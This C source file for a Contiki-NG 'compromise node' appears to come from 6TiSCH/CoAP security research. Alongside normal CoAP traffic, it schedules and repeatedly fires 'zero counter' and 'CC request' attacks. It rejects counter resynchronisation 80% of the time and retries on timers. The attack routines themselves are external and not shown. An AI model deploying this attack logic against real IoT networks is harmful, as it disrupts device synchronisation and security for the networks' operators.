#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "contiki.h"
#include "contiki-net.h"

#include "coap-engine.h"
#include "coap-blocking-api.h"
#include "sys/node-id.h"

#include "sys/log.h"
#include "lib/random.h"

#include "net/netstack.h"
#include "net/routing/routing.h"

#define LOG_MODULE "COMPROMISE NODE"
#define LOG_LEVEL LOG_LEVEL_INFO

#define SERVER_EP "coap://[fd00::201:1:1:1]"
#define TOGGLE_INTERVAL (CLOCK_SECOND / 100)

//  === ATTACK MODE SELECTION ===

/*
 * 0 = Normal Operation (No Attack)
 * 1 = Zero Counter Attack
 * 2 = CC Request Attack
 */
#define ATTACK_MODE 1

#if ATTACK_MODE == 1
extern volatile uint8_t cc_response_arrived_zero;
extern volatile uint32_t cc_received_watermark;
extern void zero_counter_attack(void);
extern void attacker_accept_resync(uint32_t watermark);

#elif ATTACK_MODE == 2
extern volatile uint8_t cc_response_arrived;
extern void cc_request_attack(void);

#endif

#if ATTACK_MODE != 0
static uint8_t first_attack_fired = 0;
static uint8_t retry_active = 0;

#endif

/*---------------------------------------------------------------------------*/
PROCESS(er_example_attacker, "Erbium Example Compromise");
AUTOSTART_PROCESSES(&er_example_attacker);

static struct etimer periodic_timer;

static struct etimer warmup_timer; /* Naya Timer */

void client_chunk_handler(coap_message_t *response)
{
  if (response == NULL)
  {
    printf("Request Timed Out (No ACK received)\n");
    return;
  }

  const uint8_t *chunk;
  int len = coap_get_payload(response, &chunk);

  printf("Server Reply: %.*s\n", len, (char *)chunk);
}

PROCESS_THREAD(er_example_attacker, ev, data)
{
  static coap_endpoint_t server_ep;
  static coap_message_t request[1];

#if ATTACK_MODE != 0
  static struct etimer first_attack_timer;
#endif

#if ATTACK_MODE == 1
  static struct etimer zero_counter_retry_timer;
#elif ATTACK_MODE == 2
  static struct etimer cc_request_retry_timer;
#endif

  PROCESS_BEGIN();

  /* =================================================================== */
  /* 1. NETWORK WARMUP DELAY (300 SECONDS)                               */
  /* =================================================================== */
  etimer_set(&warmup_timer, 300 * CLOCK_SECOND);
  PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&warmup_timer));
  /* =================================================================== */

  /* =================================================================== */

  printf("Starting 6TiSCH CoAP Client\n");

  /* Parse server endpoint */
  coap_endpoint_parse(SERVER_EP, strlen(SERVER_EP), &server_ep);

  /* Start periodic timer */
  etimer_set(&periodic_timer, TOGGLE_INTERVAL);

  /* ---> YAHAN YE LINES ADD KAREIN <--- */
#if ATTACK_MODE != 0
  /* Start First Attack Timer (120 seconds) */
  etimer_set(&first_attack_timer, 120 * CLOCK_SECOND);
#endif

  while (1)
  {
    PROCESS_YIELD(); /* Wake up on ANY event */

    /* ========================================================== */
    /* 1. NORMAL COAP TRAFFIC LOGIC (ALWAYS RUNS IN ALL MODES)    */
    /* ========================================================== */
    if (ev == PROCESS_EVENT_TIMER && etimer_expired(&periodic_timer))
    {
      if (NETSTACK_ROUTING.node_is_reachable())
      {
        printf("\n--- Sending CON POST Request to Server ---\n");
        coap_init_message(request, COAP_TYPE_CON, COAP_POST, 0);
        coap_set_header_uri_path(request, "test/hello");
        const char msg[] = "Hello Server!";
        coap_set_payload(request, (uint8_t *)msg, strlen(msg));
        COAP_BLOCKING_REQUEST(&server_ep, request, client_chunk_handler);
        printf("[Node %u] --- Request Finished ---\n", node_id);
      }
      else
      {
        printf("[Node %u] Network not reachable yet (CoAP Waiting)\n", node_id);
      }
      etimer_reset(&periodic_timer);
    }

    /* ========================================================== */
    /* 2. ATTACK LOGIC (ONLY COMPILED IF ATTACK_MODE IS 1 OR 2)   */
    /* ========================================================== */
#if ATTACK_MODE != 0

    if (ev == PROCESS_EVENT_POLL)
    {
#if ATTACK_MODE == 1

      if (cc_response_arrived_zero == 1)
      {
        cc_response_arrived_zero = 0;

        uint16_t prob = random_rand() % 100;
        if (prob < 80)
        {
          LOG_INFO("Probability hit! Rejecting Sync and Firing next zero counter!\n");
          zero_counter_attack();
        }
        else
        {

          attacker_accept_resync(cc_received_watermark);
          // LOG_INFO("Probability MISS. Normal operation for 10 seconds.\n");
          /* Again Firing zero counter -- if attack is not fired for long time */

          etimer_set(&zero_counter_retry_timer, 10 * CLOCK_SECOND);
          retry_active = 1;
        }
      }

#elif ATTACK_MODE == 2

      if (cc_response_arrived == 1)
      {
        cc_response_arrived = 0;

        uint16_t prob = random_rand() % 100;

        if (prob < 80)
        {
          LOG_INFO("Probability HIT. Firing next CC Request!\n");

          cc_request_attack();
        }
        else
        {
          // LOG_INFO("Probability MISS. Normal operation for 10 seconds.\n");
          /* Again Firing cc request -- if attack is not fired for long time */
          etimer_set(&cc_request_retry_timer, 10 * CLOCK_SECOND);
          retry_active = 1;
        }
      }
#endif
    }

    /* ========================================================== */
    /* 2. ATTACK LOGIC: TIMERS (First attack & Retries)           */
    /* ========================================================== */
#if ATTACK_MODE != 0
    /* In the first_attack_timer expiry block */
    if (!first_attack_fired && etimer_expired(&first_attack_timer))
    {
      /* Only fire if we actually have a route (preferred parent exists) */
      if (NETSTACK_ROUTING.node_is_reachable())
      {
        first_attack_fired = 1;
        etimer_stop(&first_attack_timer);

#if ATTACK_MODE == 1
        LOG_INFO("First Zero Counter Attack.\n");
        zero_counter_attack();

#elif ATTACK_MODE == 2

        // LOG_INFO("First CC Request Attack.\n");
        cc_request_attack();

#endif
      }
      else
      {
        /* Not ready yet — retry after 10 more seconds */
        LOG_INFO("Attack delayed: no preferred parent yet. Retrying in 10s.\n");
        etimer_set(&first_attack_timer, 10 * CLOCK_SECOND);
      }
    }

#endif

#if ATTACK_MODE == 1
    /* Again Firing zero counter -- if attack is not fired for long time (Probability Miss!) */
    if (retry_active && etimer_expired(&zero_counter_retry_timer))
    {
      // LOG_INFO("10 seconds completed. Starting next Zero Counter Attack.\n");

      retry_active = 0;

      // Initiating a new Zero Counter Attack
      zero_counter_attack();
    }
#elif ATTACK_MODE == 2
    /* Again Firing cc request -- if attack is not fired for long time (Probability Miss!) */
    if (retry_active && etimer_expired(&cc_request_retry_timer))
    {
      // LOG_INFO("10 seconds completed. Starting next CC Request Attack.\n");

      retry_active = 0;

      // Initiating a new CC Request Attack
      cc_request_attack();
    }
#endif

#endif /* End of ATTACK_MODE != 0 */
  }
  PROCESS_END();
}